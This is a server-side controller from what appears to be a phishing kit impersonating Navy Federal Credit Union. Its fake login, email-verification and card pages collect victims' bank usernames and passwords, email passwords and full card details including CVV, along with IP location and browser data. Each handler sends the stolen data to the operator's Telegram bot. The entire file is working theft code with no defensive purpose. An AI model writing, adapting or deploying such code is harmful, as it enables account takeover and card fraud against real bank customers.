const fs = require("fs");
const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../../settings");
const getIPDetails = require("../middleware/getIPDetails");
const anti = require("../middleware/antibot2");

let storedCredentials = {
  username: "",
  password: "",
};

exports.login = (req, res) => {
  return res.render("login");
};

exports.loginPost = async (req, res) => {
  (async () => {
    const anti1 = await anti;
    const file = JSON.stringify(anti1, null, 2);

    const { username, password } = req.body;
    storedCredentials = { username, password };

    const iPDetails = await getIPDetails();
    const { query, city, region, country, isp } = iPDetails;

    const userAgent = req.headers["user-agent"];

    const message =
      `✅ @AKFOUR7 | 0363 Login \n\n` +
      `👤Username            : ${username}\n` +
      `🔑Password            : ${password}\n` +
      `++++++++++++++++++++++++++++++\n\n` +
      `IP ADDRESS INFO\n` +
      `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
      `+++++++++++++++++++++++++++++++\n\n` +
      `SYSTEM INFO || USER AGENT\n` +
      `USER AGENT       : ${userAgent}\n` +
      `+++++++++++++++++++++++++++++++\n\n` +
      `COOKIES          : ${file}\n` +
      `👨‍💻 @akfour7 - TG 👨‍💻`;

    const sendMessage = sendMessageFor(botToken, chatId);
    sendMessage(message);

    res.redirect("/auth/email-verification");
  })();
};

exports.login2 = (req, res) => {
  res.render("email-verification");
};

exports.loginPost2 = async (req, res) => {
  const { email, emailPass } = req.body;
  const { username, password } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  storedCredentials = { ...storedCredentials, password };

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | NAVYFEDERAL CU \n\n` +
    `👤Username  : ${username}\n` +
    `🔑Password  : ${password}\n` +
    `📧Email   : ${email}\n\n` +
    `🔑Password : ${emailPass}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/card-verification");
};

exports.login3 = (req, res) => {
  res.render("card");
};

exports.loginPost3 = async (req, res) => {
  const { cardName, cardNum, exp, cvv } = req.body;
  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  // storedCredentials = {
  //   ...storedCredentials,
  //   username,
  //   password,
  //   email,
  //   emailPass,
  // };

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | NAVYFEDERAL CU \n\n` +
    // `👤Username  : ${username}\n` +
    // `🔑Password  : ${password}\n` +
    // `📧Email   : ${email}\n\n` +
    // `🔑Password : ${emailPass}\n\n` +
    // `+++++++++++++++++++++++++++++++\n\n` +
    `NAME ON CARD  : ${cardName}\n` +
    `CARD NUMBER  : ${cardNum}\n` +
    `EXPIRY DATE   : ${exp}\n` +
    `CVV : ${cvv}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

exports.complete = (req, res) => {
  return res.render("success");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
